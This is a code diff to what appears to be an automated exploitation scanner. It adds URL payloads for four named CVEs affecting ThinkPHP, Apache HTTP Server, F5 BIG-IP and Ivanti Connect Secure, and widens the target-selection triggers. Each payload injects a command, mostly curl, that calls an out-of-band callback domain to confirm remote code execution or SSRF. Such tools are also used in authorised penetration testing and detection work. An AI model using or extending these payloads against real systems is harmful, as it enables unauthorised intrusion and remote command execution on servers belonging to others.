@@ -48,6 +48,40 @@ def generate_payloads(tech_stack, oast_domain):
             "uri_append": f"/%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22ping%20-c%201%20confluence.{oast_domain}%22%29%7D/"
         })
 
+    if "php" in tech_stack or "apache" in tech_stack or "nginx" in tech_stack:
+        # ThinkPHP RCE
+        payloads.append({
+            "name": "ThinkPHP RCE (CVE-2018-20062)",
+            "headers": {},
+            "params": {},
+            "uri_append": f"/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1]=curl%20http://thinkphp.{oast_domain}"
+        })
+        # Apache Path Traversal to RCE
+        payloads.append({
+            "name": "Apache HTTP Server RCE (CVE-2021-41773)",
+            "headers": {},
+            "params": {},
+            "uri_append": f"/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh?=|echo+Content-Type:+text/plain;+echo;+curl+http://apache.{oast_domain}"
+        })
+
+    if "f5" in tech_stack or "big-ip" in tech_stack:
+        # F5 BIG-IP RCE
+        payloads.append({
+            "name": "F5 BIG-IP RCE (CVE-2020-5902)",
+            "headers": {},
+            "params": {},
+            "uri_append": f"/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=curl+http://f5.{oast_domain}"
+        })
+
+    if "ivanti" in tech_stack or "pulse" in tech_stack:
+        # Ivanti Connect Secure SSRF
+        payloads.append({
+            "name": "Ivanti Connect Secure SSRF (CVE-2024-21893)",
+            "headers": {},
+            "params": {},
+            "uri_append": f"/api/v1/totp/user-backup?user=a&v=1&url=http://ivanti.{oast_domain}"
+        })
+
     return payloads
 
 async def fire_surgical_strike(client, target, tech_stack, oast_domain):
@@ -97,7 +131,7 @@ def run_cve_sniper(session, config):
         if isinstance(h, dict) and 'url' in h and 'tech' in h:
             # Only load targets where we successfully identified the underlying technology
             tech_lower = " ".join([t.lower() for t in h['tech']])
-            if any(trigger in tech_lower for trigger in ["java", "spring", "struts", "log4j", "confluence", "atlassian"]):
+            if any(trigger in tech_lower for trigger in ["java", "spring", "struts", "log4j", "confluence", "atlassian", "php", "apache", "nginx", "f5", "big-ip", "ivanti", "pulse"]):
                 targets_with_tech[h['url']] = tech_lower
 
     if not targets_with_tech:
